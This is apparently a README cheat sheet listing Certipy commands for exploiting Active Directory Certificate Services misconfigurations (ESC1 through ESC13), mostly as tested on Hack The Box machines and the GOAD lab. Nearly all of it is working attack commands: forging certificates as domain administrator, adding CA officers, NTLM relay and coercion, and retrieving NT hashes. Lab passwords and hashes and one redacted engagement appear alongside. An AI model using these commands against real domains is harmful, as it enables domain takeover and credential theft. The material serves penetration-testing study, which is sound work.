# autoADCS

### ESC1
Tested on https://app.hackthebox.com/machines/531
```
certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
```
OR OR OR 
```
certipy-ad req -username ryan.cooper -password NuclearMosquito3 -ca sequel-DC-CA -target sequel.htb -template UserAuthentication -upn administrator@sequel.htb    
```
#### faketime
```
➜  escape ntpdate -q sequel.htb
2024-12-24 15:38:16.851156 (-0500) +28800.109132 +/- 0.083870 sequel.htb 10.10.11.202 s1 no-leap
```
```
➜  escape faketime '2024-12-24 15:38:34' certipy-ad auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
### ESC4
Tested on https://github.com/Orange-Cyberdefense/GOAD
```
certipy-ad template -username khal.drogo@essos.local -password horse -template ESC4 -save-old

certipy-ad req -username khal.drogo@essos.local -password horse -ca ESSOS-CA -target essos.local -template ESC4 -upn administrator@essos.local
```
### ESC6
Tested on https://github.com/Orange-Cyberdefense/GOAD
```
certipy-ad req -username administrator@essos.local -password horse -ca ESSOS-CA -target essos.local -template User -upn administrator@essos.local
```
### ESC7
Tested on https://app.hackthebox.com/machines/572
```
certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'pass'

certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'pass'

certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'pass'

certipy-ad ca -ca manager-DC01-CA -issue-request 21 -username raven@manager.htb -p 'pass'

certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 21 -username raven@manager.htb -p 'pass'
```
#### faketime
```
ntpdate -q 10.10.11.236

faketime '2024-12-19 08:12:01' certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
### ESC8
Tested on XXXXX-XXXXX
```
certipy-ad relay -target 'http://172.16.XX.XX/'

coercer coerce -u XX$@XXXXX.XX --hashes :3565f3f4123cfbd6fb880a0978fffc81 -l 10.XX.XX.XX -t 172.16.XX.XX --always-continue

certipy-ad auth -pfx XXXX.pfx
```
### ESC9
Tested on https://app.hackthebox.com/machines/Certified
```
certipy-ad req -username ca_operator@certified.htb -p 'Password123@' -ca certified-DC01-CA -template CertifiedAuthentication

certipy-ad account update -username ca_operator@certified.htb -hashes ':a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn administrator@certified.htb

certipy-ad auth -pfx administrator.pfx -domain certified.htb
```
### ESC11
```
certipy-ad relay -target http://10.10.10.10 -ca SubCA
```
### ESC13
Tested on https://app.hackthebox.com/machines/595
```
certipy-ad req -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -ca mist-DC01-CA -template ManagerAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096

python3 gettgtpkinit.py -cert-pfx pfx_file /svc_cabackup ccache_file -dc-ip 192.168.100.100 -
```
